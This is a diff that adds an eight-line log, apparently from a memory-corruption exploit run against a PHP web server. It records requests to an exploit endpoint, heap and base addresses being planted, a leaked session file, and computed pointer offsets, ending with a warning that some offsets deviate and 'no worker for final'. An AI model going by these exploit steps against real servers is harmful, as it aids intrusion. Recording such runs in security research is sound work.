@@ -1,0 +1,8 @@
+[02:03:57] master=167756 worker0=167760
+[02:03:57] POST /exploit/sess.php status=200 sent=80 ms=8 err=None
+[02:03:58] plant P=0x7ffad6282000 B0=0x7ffad6290000 heap=0x7ffad6200040
+[02:03:58] POST /exploit/sess.php status=502 sent=222 ms=27 err=None
+[02:03:59] GET /sites/default/files/php/sessions/sess_tb1 status=200 len=86282
+[02:03:59] K=0x7ffad6285000 offsets={'K-P': 12288, 'K-B0': -45056, 'B0-K': 45056, 'K-X': 86016, 'K-S_dest': None, 'P-K': -12288, 'X-K': -86016, 'S_dest-K': None} formula={'P_formula': 140715311505408, 'P_match': True, 'X_formula': 140715311431680, 'X_match': True, 'S_dest_formula': 140715311435840, 'S_dest_match': False, 'B0_formula': 140715311562752, 'B0_match': True}
+[02:03:59] WARNING: one or more offsets deviate on this master
+no worker for final
